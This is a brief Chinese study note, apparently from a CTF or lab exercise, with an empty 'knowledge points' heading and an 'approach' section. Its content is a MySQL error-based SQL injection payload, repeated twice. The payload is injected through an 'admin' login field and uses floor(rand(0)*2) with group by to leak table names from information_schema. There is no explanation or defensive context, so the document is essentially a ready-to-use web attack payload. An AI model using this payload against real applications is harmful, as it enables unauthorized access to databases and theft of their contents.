# 知识点：

# 思路：
admin' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #<br />![image.png](./images/20231017_2351324319.png)

admin' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #
